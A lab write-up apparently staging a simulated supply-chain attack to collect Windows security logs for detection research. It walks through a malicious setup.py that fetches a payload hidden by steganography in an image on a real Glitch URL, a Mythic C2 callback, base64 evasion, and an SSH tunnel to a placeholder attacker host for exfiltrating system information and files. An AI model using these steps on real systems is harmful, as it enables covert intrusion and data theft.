## Attack Detail

- Prepare：

    - download [pyenv-win](https://pyenv-win.github.io/pyenv-win/docs/installation.html#pyenv-win-zip)
    
    - configure python version with 3.10:
        ```
            pyenv install 3.10
            pyenv global 3.10
        ```

    - configure a simple web server with Glitch

        host the embedded image (steganography with payload to build the conneciton with C2 server and extract system info out)

        ```
        # configure website
        https://cdn.glitch.global/eb3e6f28-bcca-471f-b521-bb35172b0498/img.png

        ```

    - generate image with steganography --- with Least Significant Bit (LSB) method

        ```
        # run code to generate embedded image (embed medusa_wins.py into image.png, output img.png)
        python3 steger.py
        # img.png is uploaded to a server controlled by attacker
        ```

    - download git on windows

        - Go to the official Git website:
        👉 https://git-scm.com/download/win

        - The download should start automatically (for 64-bit Windows).

    - download some sensitive files

        ```
        # go to preset folder
        python3 sen_data.py
        ```

- Attack Steps

    - simulated normal behaviour for daily operation (increase noise) 

        - Windows Dev Host (download python package):
            
            - Pre-installed Software
                - vs code, filezilla, pip, python, git, MobaXterm, discord, 1password
            
            - Simulated Behaviours

                - 2, 3, 4, 5, 6, 7, 8, 9

    - payload execution

        ```
        # download target package sc1

        # execute installation process
        python3 setup.py install

        ```
        This setup (installation) script will download a image with embedded payload


- Trigger

    under executing setup.py --- automatically trigger the download and execution of payload

- Evasion Method

    - base64-encoded plain scripts
    - remove downloaded image (optional)

- Data Exfiltration (C2 server terminal)

    - extract system info to C2 server
    
        - On C2 Server:
    
            1. open the corresponding callback 
            2. enter the following command
                ```
                upload
                ```
            3. send two python scripts to any folder
            4. run a local server to receive package -- Flask server listen on port 8000
                ```
                python3 server.py
                ```
        
        - On target windows:
            0. download necessary libraries
            ```
            pip3 install -r requirements.txt
            ```
            1. open command console on target machine
            ```
            # for tunnel creation
            ssh -N -f -L 8000:localhost:8000 {attack_user}@{attack_public_ip}
            ```
            2. choose one file every time
            ```
            python3 SysScanner.py
            ```

- Troubleshooting:

    - No response from callback:

        need to run the installation process again to return a new callback
    
    - DLL load failed while importing xxx

        Installing the Visual C++ Redistributable for Visual Studio 2015 from this links: https://www.microsoft.com/en-us/download/details.aspx?id=48145 fixed the missing DLLs.
    

- Data Collection and Analysis:

    - Collected Data Type:

        - Event (include all types of windows event logs)
        - SecurityEvent
        - VMConnection

    - Timeline Track (British Summer Time):
        - normal behaviour: 2025.4.22 14:17 
        - attack behaviour: 2025.4.22 14:22

            - install package: 2025.4.22 14:22
            - (attack side) received callback: 2025.4.22 14.23
            - (attack side) browser the disk space
            - (attack side) upload script "SenScanner.py": upload to any writable folder (rejected for few times)
                - find writable folder at: C:\Windows\Temp\
            
            - (attacj side) check from Mythic UI -- Files -- Uploads 
            - upload site-packages from attack server to target system 2025.4.22 3:33 p.m

                ```
                # download necessary libraries
                pip3 install -r requirements.txt
                zip -r package.zip site-packages (cd to this python directory) 
                # on callback terminal
                load_module
                # select the package.zip and name it with "packs" (take a while)
                # check the libraries have been loaded into memory
                list_module 
                # the output will show "packs" 

                # start the listening process
                python3 server.py
                # load script
                load_script
                # choose two scanner scripts: one by one each 2025.4.22 3:36 p.m
                
                ```
            - received collected info (20250422_151814_info.zip) --- 2025.4.22 16:18

        ** Target Windows System Time is one hour in advance **

    - PreProcessing

        - select time scope under Monitoring - Logs - Query - Share

            2025.4.22 14:17 - 2025.4.22 16:20

    - Analysis

        


    - Involve Techniques (more detailed information can be found at attack_navigator.json):
    
        - T1030	Data Transfer Size Limits
        - T1105	Ingress Tool Transfer
        - T1132	Data Encoding
        ...